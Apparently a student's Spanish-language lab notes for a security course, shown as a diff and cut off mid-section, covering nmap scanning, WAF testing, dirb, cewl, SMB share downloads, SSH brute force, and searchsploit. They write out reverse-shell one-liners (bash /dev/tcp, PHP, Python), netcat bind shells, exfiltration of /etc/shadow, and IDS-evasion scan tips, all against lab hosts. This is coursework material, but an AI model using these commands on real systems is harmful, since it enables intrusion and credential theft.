+		http://<IP del proxy que muestra al público>/?testarg=/bin/bash (sirve cualquier parametro, en este caso he reutilizado testarg, lo importante es que pasemos el valor /bin/bash para activar estas reglas)
+
+
+NOS PROTEGE CONTRA EL ESCANER DE SERVIDORES WEB NIKTO, XSS E INYECCION SQL (pero no lo hace si estos ataques se hacen de manera ofuscada [si ofuscamos la carga util del ataque, eludimos el WAF]) !!!
+	NO PROTEGE CONTRA ALGUNOS ESCANEOS CON NMAP (PERO SÍ LOS REGISTRA EN EL LOG AUDIT)
+
+Un WAF sí protege contra los intentos de ataque automatizados (SQLi, XSS, Fuerza bruta (en algunos casos), Bots que intentan explotar vulnerabilidades conocidad, ...)
+
+Un WAF SÍ identifica el tipo de intento de ataque y se puede ver en la propiedad "msg" del ataque registrado en el log "audit"
+
+----------------------------------------------------------
+# Nikto (escaner de servidores web) [alternativa a nmap con scripts HTTP (scripts nse)].
+Lab 10, bloque 2, te interesa la página 9
+	
+	sudo nikto -host URL
+	# Ejemplo: sudo nikto -host http://192.168.102.3/
+
+		# Lo mismo pero con nmap: 
+			sudo nmap -p80 -script http-methods IP
+			sudo nmap --script http-enum IP // usar esto mejor
+
+	# Ver si el proxy lo bloquea:
+		sudo tail -f /var/log/apache2/error.log
+
+----------------------------------------------------------
+# Para intento de ataque XSS/inyección SQL.
+curl URL -d "<script>alert('test')</script>"
+
+	# Ejemplo funcional:
+		sudo curl http://192.168.102.3/ -d "<script>alert('test')</script>"
+
+	# Ver si el proxy lo bloquea:
+		sudo tail -f /var/log/apache2/error.log
+
+----------------------------------------------------------
+# Consejos.
+Para ver los logs mejor usar tail -f fichero en lugar de nano
+
+----------------------------------------------------------
+# Para ver las rutas ocultas resultantes de una web hecha con un framework como WordPress (es un ataque de fuerza bruta). [LO TIENES MEJOR COMENTADO EN ESTE FICHERO]
+Lab 11, página 4
+dirb URL
+
+	# Ejemplo funcional:
+		dirb http://192.168.11.3/eii/
+	
+
+----------------------------------------------------------
+# Para descargar un fichero compartido con el protocolo smb (samba) [LO TIENES MEJOR COMENTADO EN ESTE FICHERO]
+Primero listas los recursos de una IP/host al que acceder
+	sudo smbmap -H IP // nos da una lista de recursos
+
+Ahora para descargar hacemos:
+	sudo smbmap -H IP -r recurso/rutaDelFicheroADescargar -A 'nombreDelFichero (esto es una expresión regular, recuerda que un texto calcado también es una ER)'
+
+	# Ejemplo funcional:
+		sudo smbmap -H 192.168.11.3 -r GollumShare/etc -A 'passwd'
+
+----------------------------------------------------------
+# Para obtener un listado de palabras de una página [LO TIENES MEJOR COMENTADO EN ESTE FICHERO]
+Lab 11, página 6
+
+cewl [OPTIONS] URL
+
+	# Ejemplo funcional:
+		cewl -m 6 -w palabras.txt http://192.168.11.3/eii/
+
+			-m: indica la longitud mínima de las palabras
+
+			-w: indica que la salida se quiere volcar en un fichero
+
+----------------------------------------------------------
+# Nmap
+
+## Algunas opciones:
+	-iL <archivo con una lista de ips>: Para pasarle una lista de IPs en un archivo y no escribir a mano la (o las) IPs
+
+
+	-p <puerto inicio>-<puerto fin>: Escanea un rango de puertos
+	-p -: Escanea todos los puertos
+	-p <puerto>: Escanea solo ese puerto
+
+	--top-ports <Numero de puertos>: Escanea los "Numero de puertos" estadisticamente mas usados
+		Lista de estos puertos estadisticamente mas usados en: /usr/share/nmap/nmap-services
+			Es una lista de puertos ordenada por prevalencia en una escala de probabilidad de 0 a 1
+
+		--open: Para mostrar los puertos que estan abiertos o potencialmente abiertos
+
+
+	-O: Activa la deteccion de la version y tipo del SO [EVITA USAR ESTA OPCION, TE DETECTAN FACILMENTE]
+	-A: Deteccion de SO, servicios con mas detalle (versiones, etc), realiza un traceroute y ejecuta algunos scripts de analisis para completar la informacion que obtiene [OPCION QUE MAS DETALLES DA]
+	-sV: Investiga puertos abiertos para determinar que servicio y version estan ejecutando
+
+
+	-T4: Para hacer una ejecucion mas rápida (hay desde T0 (el mas lento) hasta T5 (el mas rapido), cuanto mas rapido lo pongamos mas detectables seremos, cuando mas lento lo pongamos mas indetectables seremos (supuestamente))
+
+
+	-sS: Usa un tipo de analisis TCP SYN (POTENCIALMENTE MAS CAPAZ DE EVADIR FIREWALLS)
+
+	
+	-sC: Utiliza el conjunto predeterminado de scripts NSE
+
+	
+	# Deteccion de hosts mediante los protocolos TCP (y relacionados)
+		-PS: TABLA 1, PAGINA 11, LAB 08-09
+		-PA: TABLA 1, PAGINA 11, LAB 08-09
+		-PY: TABLA 1, PAGINA 11, LAB 08-09
+
+	
+	# Deteccion de hosts mediante protocolos ICMP e IP
+		-Pn: TABLA 1, PAGINA 11, LAB 08-09
+		-PE: TABLA 1, PAGINA 11, LAB 08-09
+		-PP: TABLA 1, PAGINA 11, LAB 08-09
+		-PO[lista de protocolos]: TABLA 1, PAGINA 11, LAB 08-09
+		-PM: TABLA 1, PAGINA 11, LAB 08-09
+
+	
+	# Otras tecnicas de descubrimiento de host
+		-sL: Enumera los objetivos a escanear ||| Puede resolver el DNS de las direcciones IP que se le pasan
+		-PR: TABLA 1, PAGINA 11, LAB 08-09
+		-sn: TABLA 1, PAGINA 11, LAB 08-09
+		--traceroute: Obtiene una ruta al host ||| Si la ruta es correcta, el host existe
+
+
+	# Tratar con la resolucion de nombres
+		--system-dns: TABLA 1, PAGINA 12, LAB 08-09
+		-R: TABLA 1, PAGINA 12, LAB 08-09
+		-n: TABLA 1, PAGINA 12, LAB 08-09 ||| Mejora la velocidad del escaneo
+		--dns-servers <serv1[,serv2], ...>: TABLA 1, PAGINA 12, LAB 08-09
+
+
+	# Telefonía IP y otros servicios SCTP
+		-PU: Usael Stream Control Transmission Protocol (SCTP) para tratar de provocar respuestas en los objetivos y ver si existen ||| Acepta listas de puertos
+
+
+	-sU: TABLA 2, PAGINA 15, LAB 08-09 ||| Es un escaneo UDP muy lento
+
+
+# Si el objetivo tiene un IDS (Ej: Maltrail) y/o tiene firewall y puede resistir intentos de escaneo por defecto:
+	Las opciones -PA y -sN pueden ser la solucion y suficientes para escanearle los puertos
+		sudo nmap -PA -sN <IP objetivo>
+			Ejemplo:
+				sudo nmap -PA -sN eii ## no saca muchos detalles, pero funciona (saca lo basico (sin versiones de los servicios tras los puertos ni el nombre del programa del servicio (solo saca que el servicio es, por ejemplo, ssh pero no el programa que da ese servicio)))
+
+
+## Hacer un list scan (lista objetivos)
+	sudo nmap -sL
+
+	Si nmap no localiza máquinas, añade la opción -Pn a tus escaneo para evitar que el firewall los limite
+		sudo nmap -sL -Pn
+
+## Escanear un objetivo
+	sudo nmap IP
+
+
+## Escanear multiples objetivos
+	sudo nmap <IP objetivo 1> <IP objetivo 2> ... <IP objetivo N>
+
+
+## Escanear un rango de IPs
+	sudo nmap <IP inicio>-<IP final>
+		Ejemplo:
+			sudo nmap 192.168.2.1-100 (esto significa lo mismo que: 192.168.2.1-192.168.2.100)
+
+
+## Escaneado de una red completa
+	sudo nmap <CIDR>
+		Ejemplo:
+			sudo nmap 192.168.0.0/24
+
+
+## Escaneado de una red completa excluyendo ciertos hosts
+	sudo nmap <CIDR> --exclude <IP a excluir>
+		Ejemplo:
+			sudo nmap 192.168.0.0/24 --exclude 192.168.2.10
+
+
+## Identificar el SO de las máquinas activas
+	sudo nmap -O <CIDR>
+		Ejemplo:
+			sudo nmap 192.168.0.0/24
+
+
+## Escanear sólo un rango de puertos
+	sudo nmap -p <Puerto inicio>-<Puerto fin> <CIDR>
+		Ejemplo:
+			sudo nmap -p 22-80 192.168.0.0/24
+
+
+## Análisis rápido de los servicios en ejecucion de un objetivo
+	sudo nmap --top-ports 20 --open <IP del objetivo>
+		Donde:
+			--top-ports 20: Buscará los 20 puertos de red estadisticamente mas usados
+				Cómo de comun es usar un puerto se obtiene del archivo /usr/share/nmap/nmap-services
+					Ordena el uso de cada puerto por prevalencia en una escala de probabilidad de 0 a 1
+			--open: Mostrara los puertos que esten abiertos o potencialmente abiertos
+
+
+## Escaneo de puertos
+	sudo nmap -p 80,43 <IP> ## Solo escanea los puertos 80 y 443
+
+	sudo nmap -p 100-2000 <IP> ## Escaneo aleatorio de puertos del 100 a 2000
+	sudo nmap -p -2000 <IP> ## Escaneo aleatorio de puertos del 1 a 2000
+	sudo nmap -p 100- <IP> ## Escaneo aleatorio de puertos del 100 a 65536 (NADA RECOMENDABLE)
+
+	sudo nmap -p U:53,11,13,T:22-25,80,443,8080 <IP> ## Escaneo de puertos usando protocolos concretos asociados a cualquier numero de puerto usando letras
+		T: TCP
+		U: UDP
+		S: SCTP
+		P: IP
+	
+		-F (Escaneo rápido de puertos): En lugar de 1000, escanea los 100 puertos mas usados aleatoriamente
+		-r: En lugar de usar un orden de puertos aleatorio, usa uno secuencial ascendente
+
+
+## Escaneo de servicios
+	sudo nmap IP -sV
+
+
+## Escaneo ejecutando scripts (NSE Script Engine)
+	### Scripts por defecto:
+		sudo nmap -sC <IP>
+
+
+	### Escogiendo el script NSE:
+		sudo nmap --script <nombre de script y parametros> <IP>
+		-O-
+		sudo nmap --script <nombre de script> --script-args <parametros del script> <IP objetivo O una URL>
+
+		Los scripts disponibles en un momento dado se listan haciendo: locate "*.nse"
+			Truco: locate "*.nse" | grep smb
+		       	       locate "*.nse" | grep http
+		               locate "*.nse" | grep <nombre del servicio>
+
+			SI LOCATE NO FUNCIONA HAZ ESTO "sudo updatedb" Y VUELVE A PROBAR
+
+		Los scripts se instalan en /usr/share/nmap/scripts (Hay que ir a ese directorio para hacer el locate "*.nse")
+
+
+	### CATEGORIAS de scripts para ENUMERACION:
+		[Final de la página 20 y principio de la página 21 del lab 08-09]
+
+
+	### SCRIPTS de RECOPILACION de informacion:
+		[Página 23 del lab 08-09]
+
+		#### El script de fuerza bruta a servidores DNS (dns-brute.nse) sólo funciona pasandole la URL del servidor, no su ip (Ej: con ingenieriainformatica.lab8.ssi.es funciona, pero con 192.168.8.34 no; Otro ej: con epi.lab8.ssi.es funciona, pero con 192.168.8.48 no)
+
+
+	### El nombre del script de geolocalizacion con BBDD/servicios externos en el guión está mal, el nombre correcto es: ip-geolocation-geoplugin.nse
+		Ejemplo:
+			sudo nmap --script ip-geolocation-geoplugin.nse www.ingenieriainformatica.uniovi.es
+
+
+	### El script que ejecuta una prueba de vulnerabilidades completa contra un objetivo se llama: vuln
+		ES UN SCRIPT DE DETECCION DE CVE
+
+		OJO: es muy lento y el tamaño de salida es grande (es preferible volcar la salida a un archivo)
+
+		Ejemplo:
+			sudo nmap -Pn --script vuln -oN <nombre fichero salida> <URL o IP objetivo>
+
+			En la practica lo probamos con la IP de la máquina "obsolete" en lugar de la de la máquina "vulnerable", así lo pedían y sólo sacabamos la info de las vulnerabilidades (los CVE) con la "obsolete"
+
+		### HAY UN SCRIPT DE TERCEROS QUE LO MEJORA (SACA MUCHA MAS INFO Y ES MIL VECES MAS DETALLADO Y RAPIDO): nmap-vulners
+			sudo nmap -sV --script nmap-vulners/ -oN <nombre fichero salida> <URL o IP objetivo>
+
+			SI NO VA, SIGUE EL TUTORIAL QUE ANOTASTE JUSTO DEBAJO
+
+
+## Para utilizar cualquier script de terceros, debes seguir este procedimiento:
+	Descargar la carpeta o el archivo .nse del script en la carpeta de scripts NSE (/usr/share/nmap/scripts).
+
+	### Para el caso del script "nmap-vulners" sería hacer:
+		git clone https://github.com/vulnersCom/nmap-vulners.git
+
+		Movemos la carpeta o el archivo .nse del script en la carpeta de scripts NSE (/usr/share/nmap/scripts), en este caso movemos la carpeta
+
+		Una vez estemos en dicha carpeta de scripts NSE (/usr/share/nmap/scripts), actualizamos la BBDD de scripts nmap con:
+			sudo nmap --script-updatedb
+
+		Una vez hecho esto, podemos ejecutar el script como cualquier script estandar que ya hemos visto
+			sudo nmap -sV --script nmap-vulners/ <IP objetivo> 
+
+
+## Formatos de salida de nmap
+	nmap acepta 3 formatos de salida diferentes, añadiendo los siguientes parametros a cualquiera de los escaneos que se pueden realizar.
+
+		### Formato NMap: -oN <fichero>
+			Equivalente a redirigir la salida NMap a un archivo, sigue la estructura de salida tradicional vista en teoria
+
+
+		### Formato "Grepeable": -oG <fichero>
+			Transforma la salida para que cada vez que un comando grep encuentre una coincidencia con la palabra que estamos buscando se muestre mas informacion.
+			
+			Tambien facilita su proceso mediante expresiones regulares
+
+
+		### Formato XML: -oX <fichero>
+			La salida tradicional contenida en una estructura XML.
+	
+			Aparte de ser mucho mas sencillos de procesar por programa, estos archivos pueden ser importados directamente por METASPLOIT para usar los resultados de un analisis para comenzar operaciones de explotacion.
+
+
+## FUERZA BRUTA EN LINEA CON NMAP:
+	"Con la lista de palabras generada anteriormente, usa nmap y su NSE Script Engine para encontrar scripts adecuados para atacar a través por fuerza bruta a servicios activos en la máquina vulnerable que aceptan usuarios / contraseñas"
+
+	Usamos el NSE Script Engine junto con la lista de palabras a usar como contraseñas generada con cewl
+
+	### Proceso:
+		#### Examinamos el contenedor vulnerable para encontrar servicios.
+			sudo nmap 192.168.11.3 (Si quieres mas detalles: sudo nmap -sV 192.168.11.3)
+
+		#### Localiza los scripts NSE adecuados que utilicen técnicas de fuerza bruta contra ellos (vete al directorio /usr/share/nmap/scripts).
+			EL SCRIPT QUE BUSCAMOS VA A LLEVAR LA PALABRA BRUTE
+			
+			Solucion para encontrarlo: locate "*.nse" | grep brute
+
+			En el lab hemos pillado el del servicio ssh: ssh-brute.nse
+
+		Usa el hecho de que sabemos que un usuario válido en el sistema remoto es remotessiuser.
+
+		#### Examina la documentación del script para iniciar el ataque con la lista de palabras generada contra los servicios.
+			sudo nano ssh-brute.nse
+			
+			Nos dice que se usa de la siguiente forma:
+				sudo nmap -p 22 --script ssh-brute --script-args userdb=<lista de usuarios>,passdb=<lista de contraseñas>,ssh-brute.timeout=4s <IP objetivo>
+
+				Tanto el parametro de usuarios como de contraseñas hay que pasarle listas (aunque tengas solo 1 elemento en ellas, no te deja poner el usuario ssiuser en el parametro del usuario a pelo)
+					Ejemplo:
+						sudo nmap -p 22 --script ssh-brute --script-args userdb=usuario.txt,passdb=fichero_palabras_pagina_de_la_eii_obtenidas_con_cewl,ssh-brute.timeout=4s 192.168.11.3
+
+			El script hará fuerza bruta con la lista de usuarios (en nuestro caso hay solo 1) y con la lista de contraseñas hasta dar con la combinacion usuario-contraseña correcta. Cuando dé con ello nos mostrará la solucion
+
+		#### Comprobamos que podemos acceder al servicio.
+			sudo ssh <username>@<IP objetivo>
+				Ejemplo:
+					sudo ssh remotessiuser@192.168.11.3
+			
+			Te pedirá la contraseña y la metes.
+
+			Si todo sale bien tendrás acceso ssh a la máquina victima.
+
+			Sales de la conexion ssh con exit
+
+
+## Acceso por fuerza bruta a través de SSH (ES LO MISMO DE ANTES PERO MAS "RESUMIDO")
+	sudo nmap -p 22 --script ssh-brute --script-args userdb=listaDeUsuarios(usuario por linea).txt,passdb=listaDeContraseñas(contraseña por linea).txt <IP>
+
+	# Ejemplo funcional
+		sudo nmap -p 22 --script ssh-brute --script-args userdb=usuario.txt,passdb=palabras.txt 192.168.11.3
+
+----------------------------------------------------------
+# Estados de los puertos
+Open: Hay un servicio esperando una conexión en este puerto.
+
+Closed: Ningún servicio parece estar esperando conexiones en este puerto.
+
+Filtered: Los paquetes NMap no se reciben en este puerto, por lo que su estado actual es desconocido.
+
+Unfiltered: Los paquetes NMap se reciben en este puerto, pero alguna razón impide que NMap sepa en qué estado está el puerto.
+
+Open/Filtered: NMap no puede decidir en cuál de estos dos estados está el puerto.
+
+Closed/Filtered: Ídem al anterior
+
+----------------------------------------------------------
+# Proxy inverso (para aislar un servidor web de accesos desde el exterior de forma que haya un servicio accesible sin exponer su servidor real)
+
+En la práctica se implementó con un servidor Apache 2 situado en una maquina docker destinada a funcionar solo como proxy inverso
+
+Te podrás conectar correctamente a cada servidor web situado detras del proxy inverso a traves de las direcciones URL especificadas de la maquina proxy
+
+Los clientes realmente no pueden saber ningun detalle sobre la infraestructura que les esta sirviendo (cuantos servidores hay, software instalado, ...)
+
+Los clientes solo pueden acceder a aquellos servicios que se han creado para ser publicos.
+	Otros servicios como los internos, auxiliares o de depuracion no pueden ser localizados al otro lado del proxy por ningun cliente.
+
+	Los proxies inversos actuan como "puertas" (o puntos de acceso unicos) a partes publicas de una infraestructura potencialmente mucho mas compleja.
+
+ 
+# Configuracion (RECUERDA QUE EN EL LAB HEMOS IMPLEMENTADO EL PROXY INVERSO EN UN SERVIDOR APACHE2):
+	La configuracion del proxy se configura editando el fichero:
+		sudo nano /etc/apache2/sites-enabled/000-default.conf
+
+	## Para redirigir las solicitudes a "<IP del proxy>/epi" y "<IP del proxy>/eii" a las IPs correspondientes a su servidor/maquina, añadimos al final del fichero (y dentro de la etiqueta VirtualHost) las siguientes directivas:
+		<Location "/<URL>"> # Por ejemplo: "/eii"
+			ProxyPass "http://<Server IP>/"
+			ProxyPassReverse "http://<Server IP>/"
+		</Location>
+
+			Ejemplo:
+				<Location "/eii">
+					ProxyPass "http://<IP de la maquina EII detras del proxy inverso>/"
+					ProxyPassReverse "http://<IP de la maquina EII detras del proxy inverso>/"
+				</Location>
+
+				<Location "/epi">
+					ProxyPass "http://<IP de la maquina EPI detras del proxy inverso>/"
+					ProxyPassReverse "http://<IP de la maquina EPI detras del proxy inverso>/"
+				</Location>
+
+	Guardamos, cerramos el archivo y reiniciamos Apache2:
+		sudo service apache2 restart
+
+	Las peticiones que se bloqueen estarán en el archivo: /var/log/apache2
+
+	## Para probarlo:
+		### Desde el contenedor Kali:
+			curl <IP del servidor proxy inverso en la red "front_net" [la ip que expone al publico]>/eii (Esto SI debería funcionar y así es)
+			curl <IP del servidor proxy inverso en la red "front_net" [la ip que expone al publico]>/epi (Esto SI debería funcionar y así es)
+			
+			curl <IP del servidor proxy inverso en la red "front_net" [la ip que expone al publico]> (Esto NO debería funcionar y así es)
+			
+			curl <IP del servidor proxy inverso en la red "back_net" [la ip que expone a las maquinas que estan detras de el (la ip "privada")]>/eii (Esto NO debería funcionar y así es)
+			curl <IP del servidor proxy inverso en la red "back_net" [la ip que expone a las maquinas que estan detras de el (la ip "privada")]>/epi (Esto NO debería funcionar y así es)
+
+			curl <IP de la maquina EII]>/eii (Esto NO debería funcionar y así es)
+			curl <IP de la maquina EPI]>/epi (Esto NO debería funcionar y así es)
+
+			curl <IP de la maquina EII]> (Esto NO debería funcionar y así es)
+			curl <IP de la maquina EPI]> (Esto NO debería funcionar y así es)
+
+		### Desde el navegador del host de la infraestructura:
+			Igual que con el curl en la Kali
+
+			Al ser el host, tiene acceso a todas las máquinas de la infraestructura, por tanto, los casos en los que el curl no funcionaba en la Kali aquí sí funcionan.
+		
+			Pero si lo hicieramos desde el navegador de una máquina que está dentro de la infraestructura, obtendriamos los mismos resultados que en la Kali (que son los esperados)
+
+	
+	NOTA: Por favor, no olvides copiar el archivo /etc/apache2/sites-enabled/000-default.conf a /shared para conservarlo y restaurar los cambios en caso de que el contenedor proxy se cerrase accidentalmente
+
+Nuestro proxy inverso tiene instalado un WAF (mod_security) para proteger las aplicaciones web (en nuestro caso los servidores eii y epi que estan detras del proxy inverso) contra varios tipos de amenazas.
+
+----------------------------------------------------------
+# Dirb (para ver si una web tiene ficheros interesantes accesibles en su servidor web, aunque no esten enlazados en la pagina) [parte de initial access]
+
+CHEATSHEET EN LA PÁGINA 4 DEL LAB 11
+
+Te permite localizar archivos potenciales que no estan enlazados en la web, pero que pueden contener informacion "jugosa".
+
+HACE FUERZA BRUTA CONTRA UNA WEB PARA ENCONTRAR DIRECTORIOS OCULTOS CON POSIBLE INFORMACION SENSIBLE Y/O PRIVADA
+
+## Uso:
+	sudo dirb <URL>
+		Ejemplo:
+			sudo dirb http://192.168.11.3/eii/
+
+	sudo dirb <URL> -o <nombre fichero salida> (el orden ta bien, no te rayes)
+		Ejemplo:
+			sudo dirb http://192.168.11.3/eii/ -o fichero_salida_dirb_con_los_ficheros_interesantes_ocultos_en_la_web_de_la_eii
+
+	
+	Pones los directorios que te muestra como resultado en la URL del navegador y ya puedes acceder a estos directorios ocultos para sacar informacion interesante de la web oculta.
+
+----------------------------------------------------------
+# SMBMap o smbclient (para enumerar y exfiltrar carpetas compartidas con el protocolo SMB) [parte de initial access]
+
+Para saber si un servidor expone ficheros interesantes a traves de su funcionalidad de ficheros compartidos con el protocolo SMB y luego exfiltrarlos a traves de dicho protocolo
+
+Tambien te permiten enumerar si hay carpetas SMB compartidas y, una vez que las encontramos, descargar archivos confidenciales de ella.
+
+Recuerda que el acceso a recursos compartidos mal configurado puede no requerir un usuario y/o contraseña validos en el sistema remoto.
+
+
+## SMBMap:
+	sudo smbmap --help (ayudate de esto)
+
+	### Enumerar recursos compartidos:
+		sudo smbmap -H <IP_DEL_SERVIDOR>
+			Ejemplo:
+				sudo smbmap -H 192.168.11.3
+	
+		#### Si requiere autenticacion (usuario y contraseña) [lo sabes si pone "NO ACCESS" en los Permissions]:
+			sudo smbmap -H <IP objetivo> -u <Username en el equipo objetivo> -p '<Password del username del objetivo>'
+
+	
+	### Buscar un archivo compartido:
+		sudo smbmap -H <IP_DEL_SERVIDOR> -u <username objetivo> -p '<password objetivo>' -r <nombre del recurso a buscar>
+			Ejemplo:
+				sudo smbmap -H 192.168.11.3 -r GollumShare/etc | grep passwd (teniamos read only en GollumShare) (con esto sabemos si hay un "passwd" en /etc en el recurso compartido GollumShare)
+
+
+	### Descargar un archivo compartido:
+		sudo smbmap -H <IP_DEL_SERVIDOR> -u <username objetivo> -p '<password objetivo>' --download "<ruta al recurso a descargar>"
+			Ejemplo:
+				sudo smbmap -H 192.168.11.3 --download GollumShare/etc/passwd (si hacemos ls en el directorio donde ejecutamos este comando veremos el fichero exfiltrado)
+
+
+
+## Smbclient:
+	sudo smbclient --help
+
+	### Conectarte al recurso compartido:
+		sudo smbclient -L //<IP_DEL_SERVIDOR>/ -N
+			Ejemplo:
+				sudo smbclient -L //192.168.11.3/ -N
+
+
+	### Accede al recurso
+		sudo smbclient //<IP_DEL_SERVIDOR>/<recurso> -N
+			Ejemplo:
+				sudo smbclient //192.168.11.3/GollumShare -N
+
+		#### Una vez dentro, puedes navegar con comandos tipo FTP:
+
+    			ls para listar archivos
+    			cd <directorio> para cambiar de directorio
+    			get <archivo> para descargar un archivo
+				
+				Ejemplo:
+					cd etc
+					get passwd
+			SALES CON exit
+
+		Al hacer ls en la maquina de ataque verás el fichero exfiltrado	
+
+----------------------------------------------------------
+# Cewl [parte de initial access (puedes crear el fichero para ayudarte en el initial access por fuerza bruta)]
+
+CHEATSHEET EN LA PÁGINA 6 DEL LAB 11
+
+Te puede servir para obtener un fichero con palabras de una web que pueden coincidir con contraseñas de usuarios y, por tanto, romper fácilmente las cuentas (con fuerza bruta, claro)
+
+Te permite generar un fichero con las palabras de una web, luego ese fichero lo puedes usar como lista de contraseñas en ataques de fuerza bruta para romper las contraseñas de victimas en una maquina objetivo y así obtener el initial access.
+
+PARA USAR LA LISTA DE PALABRAS CON LAS HERRAMIENTAS DE FUERZA BRUTA HAY QUE GENERAR DICHA LISTA CON SOLO LAS PALABRAS, NO PUEDEN HABER CONTADORES ASOCIADOS A CADA UNA DE ELLAS NI NADA DEL ESTILO, SOLO LAS PALABRAS.
+
+## Uso para utilizar el fichero con herramientas de fuerza bruta:
+	sudo cewl [Opciones] <URL>
+	
+	#### Para que la lista de palabras sea con palabras de mas de 5 caracteres contenidas en la web de la EII
+		sudo cewl -m 6 -w fichero_palabras_pagina_de_la_eii_obtenidas_con_cewl http://192.168.11.3/eii/
+
+EN EL LAB USAMOS ESA LISTA PARA HACER FUERZA BRUTA CON NMAP A SERVICIOS ACTIVOS EN UNA MAQUINA VULNERABLEQUE ACEPTAN USUARIOS / CONTRASEÑAS (VER: FUERZA BRUTA EN LINEA CON NMAP, EN LA SECCION DE NMAP DE ESTE BLOC DE NOTAS)
+
+----------------------------------------------------------
+# Netcat
+
+## Poner a escuchar netcat en un puerto:
+	sudo nc -lvp <puerto>
+		Ejemplo:
+			sudo nc -lvp 777
+	
+## Conectarte desde otra máquina a ese proceso netcat que está escuchando en el puerto:
+	### Usando telnet:
+		sudo telnet <IP maquina con netcat escuchando> <puerto>
+			Ejemplo:
+				sudo telnet 172.18.0.3 777 (es la IP de la interfaz eth0 de la maquina "escuchante" || en el lab 11 funciona)
+				sudo telnet 192.168.11.2 777 (es la IP de la interfaz eth1 de la maquina "escuchante" || en el lab 11 funciona) [suele hacerse con la IP que sale en los dibujos de las practicas (esta), pero si no funciona entonces hazlo con la otra IP]
+
+	### Usando netcat:
+		sudo nc <IP maquina con netcat escuchando> <puerto>
+			Ejemplo:
+				sudo nc 172.18.0.3 777 (es la IP de la interfaz eth0 de la maquina "escuchante" || en el lab 11 funciona)
+				sudo nc 192.168.11.2 777 (es la IP de la interfaz eth1 de la maquina "escuchante" || en el lab 11 funciona) [suele hacerse con la IP que sale en los dibujos de las practicas (esta), pero si no funciona entonces hazlo con la otra IP]
+
+----------------------------------------------------------
+# Bind Shell (la maquina atacante se conecta a un proceso netcat escuchando en un puerto de la victima)
+Lab 11, bloque 2
+
+CHEATSHEET EN LA PÁGINA 9 DEL LAB 11
+
+RECUERDA QUE ES LA FORMA DE SHELL REMOTO MENOS USADA PORQUE LOS FIREWALLS GENERALMENTE CIERRAN TODOS LOS PUERTOS SALVO SERVICIOS CONOCIDOS AUTORIZADOS
+
+## Proceso:
+	### Hacemos en la máquina victima:
+		sudo nc -lvp <puerto> -e /bin/sh
+
+	### Hacemos en la máquina de ataque:
+		sudo nc <IP victima> <puerto>
+
+	Ahora podemos ejecutar comandos en la maquina victima desde la de ataque
+
+		Ejemplo funcional:
+			ls /
+			cat /etc/shadow
+			sudo su - root (hay que poner la contraseña en la MV victima porque la pide ahí y no la podemos escribir desde la MV de ataque (creo)) [escalamos a root]
+
+
+## Exfiltramos /etc/shadow haciendo esto:
+	
+	En la máquina de ataque conectada a la victima hacemos:
+		nc <IP atacante> <puerto B> < /etc/shadow
+
+	Abrimos otra terminal en la máquina de ataque y ponemos esto:
+		nc -lvnp <puerto B> > shadow_robado.txt
+			Esto guarda todo lo que llegue de ese puerto al archivo shadow_robado.txt
+
+	Al hacer...
+		cat shadow_robado.txt
+	Veremos el contenido del shadow de la MV victima!
+	El shadow ha sido exfiltrado!
+
+----------------------------------------------------------
+# Reverse Shell con netcat (la maquina victima se conecta a la atacante aprovechando una vulnerabilidad RCE (Remote Code Execution) en la victima que la utilizamos para ejecutar Netcat)
+Lab 11, página 10
+
+ES LA FORMA MAS COMUN DE USAR NETCAT PARA EXPLOITING PORQUE LOS FIREWALLS GENERALMENTE BLOQUEAN EL TRAFICO ENTRANTE PERO NO SALIENTE, POR TANTO LEVANTA MUCHAS MENOS SOSPECHAS
+
+## Proceso:
+	### Hacemos en la máquina de ataque:
+		sudo nc -lvp <puerto>
+
+	### Hacemos en la máquina victima:
+		sudo nc <IP atacante> <puerto> -e /bin/sh
+
+	Ahora podemos ejecutar comandos en la maquina victima desde la de ataque
+
+
+## Exfiltramos /etc/shadow haciendo esto:
+	
+	Abrimos otra terminal en la MV de ataque y ponemos esto:
+		sudo nc -lvnp <puerto B> > shadow_robado.txt
+
+	En la Shell remota de la MV de ataque (en la terminal de la MV de ataque en la que hiciste la conexión vaya)
+
+		sudo nc <IP atacante> <puerto B> < /etc/shadow
+
+	Ahora si hacemos en la MV de ataque:
+		cat shadow_robado.txt
+	veremos el shadow exfiltrado
+
+----------------------------------------------------------
+# Reverse Shell SIN netcat
+En la maquina víctima no usaremos netcat para conectarnos a la maquina atacante, usaremos php y python3 en la victima para ello
+
+## Hacemos en la máquina de ataque:
+		sudo nc -lvp <puerto>
+
+## Hacemos en la máquina victima (en funcion del lenguaje disponible en la victima):
+
+	### Bash reverse shell:
+		bash -i >& /dev/tcp/<IP de la máquina atacante>/<puerto> 0>&1 (no te rayes si ves la consola de la atacante "vaciada")
+
+	### PHP reverse shell:
+		php -r '$sock=fsockopen("<IP de la máquina atacante>",<puerto>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+	### Python reverse Shell:
+		python3 -c 'import socket,subprocess,os;s=socket.socket (socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP de la máquina atacante>",<puerto>)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+	Despues de ejecutar en la victima una de esas 3 órdenes, podremos ejecutar ordenes en la victima desde la maquina atacante
+
+----------------------------------------------------------
+# Searchsploit (para buscar exploits de ExploitDB con su mirror offline)
+Lab 11, página 11-12
+
+CHEATSHEET EN LA PÁGINA 12 DEL LAB 11
+
+## Proceso:
+	### Previamente hacemos nmap a la máquina victima buscando sus servicios para buscarles los exploits.
+		sudo nmap -sV <IP victima> (nos interesa saber los servicios y sus versiones de la victima [columna "VERSION" en los resultados del nmap ejecutado)
+
+
+	### Actualizamos la BBDD de searchploit con:
+		searchsploit -u
+
+
+	### Para buscar todas los exploits sobre un "termino" pones:
+		searchsploit <termino a buscarle exploit>
+			Ejemplo:
+				searchsploit vsftpd
+				searchsploit "Apache 2.4.49"
+				searchsploit "Drupal 7 RCE"
+
+		#### Puedes filtrar por el SO así:
+			searchsploit <termino> | grep linux
+				Ejemplo:
+					searchsploit vsftpd | grep linux
+
+					Resultados:
+						vsftpd 2.0.5 - 'CWD' (Authenticated) Remote M | linux/dos/5814.pl
+						vsftpd 2.3.2 - Denial of Service              | linux/dos/16270.c
+
+						(El 5814 y el 16270 son el EDB-ID de cada exploit (es el nº de cada exploit))
+						(El linux/dos/5814.pl y el linux/dos/16270.c son rutas relativas al codigo de cada exploit. Para ver la ruta completa haces: searchsploit -p linux/dos/16270.c)
+
+
+	### Inspeccionamos el exploit así:
